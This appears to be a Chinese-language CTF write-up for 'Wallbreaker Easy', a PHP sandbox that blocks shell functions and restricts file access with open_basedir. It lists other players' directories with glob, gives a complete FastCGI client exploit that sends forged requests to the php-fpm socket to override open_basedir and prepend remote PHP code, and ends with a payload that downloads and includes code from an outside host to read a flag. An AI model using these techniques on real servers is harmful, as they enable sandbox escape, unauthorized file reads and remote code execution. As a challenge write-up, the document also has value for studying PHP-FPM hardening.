# Wallbreaker Easy

- 這題給我們執行任意php code的功能
- 但設了一堆`disable_functions`和`open_basedir`等security policy (可以從`phpinfo()`查看)
    - `disable_functions`: `pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail`
    - `open_basedir`限制只能存取`/tmp/md5(IP)/`底下的東西 
    - 其中可以發現他是用`FPM/FastCGI`

- PHP的`glob`可以直接無視`open_basedir`列目錄，但沒辦法讀檔案

```php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/php/*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
echo 1234;
$it = new DirectoryIterator("glob:///v??/run/php/.*");
foreach($it as $f) {  
    $file_list[] = $f->__toString();
}
sort($file_list);  
foreach($file_list as $f){  
        echo "{$f}<br/>";
}
```

- 可以透過`glob`去找php-fpm的unix socket檔名
    - `/var/run/php/php7.2-fpm.sock`
- 也能夠直接列別人目錄底下的內容

```
phpjU1MT8
gbm.mvg
out.txt
a.mvg
hook_setlocale.so
test.docx
flag6HQiRO
flagP172KD
flagXf9Py9
imgLr0ONK
imgdmFOiN
imgtTneHL
test
input
lib.so
haha.jpg
haha.so
magick-15IU6hkSBzxfQU
magick-15_c-AyGpZV64Y
magick-15c0SdVOY2t0Rw
magick-35PXaz2p6YWcU9
poc
poc.php
index.php
rsvg-convert
1
ggg.png
|file -
ps.txt
bypass_disablefunc.php
bypass_disablefunc_x64.so
image1
image1.png
testXXXX

awesomefoo.jpg
awesomefoo.mvg
rpisec.mvg
a.php
kaibro.so
1.php
poc.php
poc.xml
lib
1
bypass_disablefunc_x64.so
bypass_disablefunc_x64.so
shell.php
magick-11kjeXi6XXo8aI
magick-16CyaWpHQXyZLq
magick-16xld7O5CUZKaV
rsvg-convert
someimg3.jpg
a.php
kaibro.so
some_dudes_output.mvg
adami.so
input
out
dupa.so
flag
flag0MCNNZ
imgoTDOnX
outimgQpENAY
imgaaa.svg
shell.jpg
imgaaa.svg
ps.svg
vvvvvaIfIgR.mvg
bypass_disablefunc_x64.so
out.ilbm
out.txt
test.php
gbm.jpg
awesomefoo.gif
adami.so
dupa
dupax
input
lib.so
out
haha.jpg
haha.so
cat.jpg
shell.jpg
vvvvvgMbpZ1.mvg
vvvvvgfxLId.mvg
poc.png
png.la
orange.so
wdwd1.so

php8PGzRh
phpMMksxY
phpWuofwP
phpi4mT51
phpuVbj0w
otsosi
rsvg-convert
gbm.jpg
someimg6.jpg
awesomefoo.gif
awesomefoo.ps
a.php
kaibro.so
adami.so
dupa
dupax
dupay
input
lib.so
out
xD
haha.jpg
haha.so
dupa.so
flag
flaggF33r6
cat.jpg
shell.jpg
foobar.x
awesomefoo.gif
poc.png
exploit.php
png.la
png.so
orange.so
bypass_disablefunc_x64.so
out.ilbm
out.txt
test.php
wdwd1.so
wdwd2.php
```

- 由於他是使用PHP-FPM/Fastcgi的架構，我們可以偽造Fastcgi protocol去繞過一些安全策略(e.g. `open_basedir`)
    - 前面我們已經找到unix socket位置了，接下來只需要建立socket連線構造fastcgi請求即可
    - 所以可以簡單地修改[Link](https://gist.github.com/wofeiwo/4f41381a388accbf91f8)，這份code去繞過`open_basedir`讀檔案

```php
<?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron <pierrick@webstart.fr>
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    {
        $this->_host = $host;
        $this->_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this->_keepAlive = (boolean)$b;
        if (!$this->_keepAlive && $this->_sock) {
            fclose($this->_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this->_keepAlive;
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this->_sock) {
            $this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
            if (!$this->_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        return chr(self::VERSION_1)         /* version */
            . chr($type)                    /* type */
            . chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
            . chr($requestId & 0xFF)        /* requestIdB0 */
            . chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
            . chr($clen & 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen < 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
            $nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
        }
        if ($vlen < 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
            $nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
        }
        /* nameData & valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen >= 128) {
                $nlen = ($nlen & 0x7F << 24);
                $nlen |= (ord($data{$p++}) << 16);
                $nlen |= (ord($data{$p++}) << 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen >= 128) {
                $vlen = ($nlen & 0x7F << 24);
                $vlen |= (ord($data{$p++}) << 16);
                $vlen |= (ord($data{$p++}) << 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this->_sock, self::HEADER_LEN)) {
            $resp = $this->decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len && $buf=fread($this->_sock, $len)) {
                    $len -= strlen($buf);
                    $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this->_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this->connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this->buildNvpair($info, '');
        }
        fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this->readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this->readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
        }
    }
    /**
     * Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
        $this->connect();
        $request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key => $value) {
            $paramsRequest .= $this->buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this->buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this->buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this->buildPacket(self::STDIN, $stdin);
        }
        $request .= $this->buildPacket(self::STDIN, '');
        fwrite($this->_sock, $request);
        do {
            $resp = $this->readPacket();
            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
                $response .= $resp['content'];
            }
        } while ($resp && $resp['type'] != self::END_REQUEST);
        var_dump($resp);
        if (!is_array($resp)) {
            throw new Exception('Bad request');
        }
        switch (ord($resp['content']{4})) {
            case self::CANT_MPX_CONN:
                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
                break;
            case self::OVERLOADED:
                throw new Exception('New request rejected; too busy [OVERLOADED]');
                break;
            case self::UNKNOWN_ROLE:
                throw new Exception('Role value not known [UNKNOWN_ROLE]');
                break;
            case self::REQUEST_COMPLETE:
                return $response;
        }
    }
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
    die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
    $filepath = __FILE__;
}else{
    $filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php/php7.2-fpm.sock", -1);
$code = "<?php echo(\$_REQUEST['command']);?>"; // php payload
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://kaibro.tw/myphpcode";
$params = array(
        'GATEWAY_INTERFACE' => 'FastCGI/1.0',
        'REQUEST_METHOD'    => 'POST',
        'SCRIPT_FILENAME'   => $filepath,
        'SCRIPT_NAME'       => $req,
        'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
        'REQUEST_URI'       => $uri,
        'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
        'PHP_VALUE'         => $php_value,
        'SERVER_SOFTWARE'   => '80sec/wofeiwo',
        'REMOTE_ADDR'       => '127.0.0.1',
        'REMOTE_PORT'       => '9985',
        'SERVER_ADDR'       => '127.0.0.1',
        'SERVER_PORT'       => '80',
        'SERVER_NAME'       => 'localhost',
        'SERVER_PROTOCOL'   => 'HTTP/1.1',
        'CONTENT_LENGTH'    => strlen($code)
        );
echo "Call: $uri\n\n";
echo strstr($client->request($params, $code), "PHP Version", true)."\n";
?>
```

- 如此一來就能繞過`open_basedir`的限制讀原本的讀不到的檔案了
    - 但對於`disable_functions`，由於底層實作的關係，沒辦法覆寫設定繞過
- 例如: `/etc/passwd`和`/tmp/xxxxxxxx/flag`
- 非常剛好的，我發現有人跑完`/readflag`後，直接把output導到一個檔案`flag111.txt`
- 所以我就能用這個方法去讀flag

Payload:

```php
backdoor=
var_dump(file_put_contents("/tmp/42126aff4925d8592d6042ae2b81de09/exp.php", file_get_contents("http://kaibro.tw/myfastcgi.txt")));
include("/tmp/42126aff4925d8592d6042ae2b81de09/exp.php");
var_dump(file_get_contents("/tmp/xxxxxxxx/flag111.txt"));
```

Output:

```
flag{PUTENVANDIMAGICKAREGOODFRIENDS}
```
